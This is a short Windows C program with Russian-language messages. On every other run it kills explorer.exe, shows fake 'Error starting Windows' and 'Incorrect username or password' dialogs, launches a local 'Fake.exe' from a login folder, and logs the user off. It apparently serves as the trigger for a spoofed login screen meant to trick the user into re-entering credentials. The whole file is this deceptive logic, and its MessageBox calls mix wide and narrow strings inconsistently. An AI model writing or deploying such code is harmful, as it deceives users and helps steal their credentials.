#include <stdio.h>
#include <Windows.h>
#include <locale.h>

int main() {
	setlocale(LC_ALL, "rus");
	LPCSTR RegName = "LoginFormBoolValue", RegSubKey = "SOFTWARE\\LoginForm";
	HKEY HKey = HKEY_CURRENT_USER, key;
	DWORD RegValue = 0, RegType = REG_DWORD, len = sizeof(RegValue), RegEditValue = 0;
	unsigned long check; // 1 - registry is created 2 - registry is opened
	RegCreateKeyExA(HKey, RegSubKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &key, &check);
	(check == 1 ? RegSetValueExA(key, RegName, 0, REG_DWORD, &RegValue, 4) : RegQueryValueExA(key, RegName, NULL, &RegType, &RegValue, &len));
	RegEditValue = RegValue ^ 1;
	RegSetValueExA(key, RegName, 0, REG_DWORD, &RegEditValue, 4);
	if (RegValue == 0) {
		WinExec("TASKKILL /F /IM explorer.exe", 0);
		MessageBox(NULL, L"Ошибка при запуске Windows", "ERROR 16493", MB_OK);
		WinExec("C:\\Users\\ShiFu\\Documents\\Login\\Fake.exe", 0);
		MessageBox(NULL, L"Неверное имя пользователя или пароль.", "ERROR 16495", MB_OK);
		ExitWindowsEx(EWX_LOGOFF, 0);
	}
	return 0;
}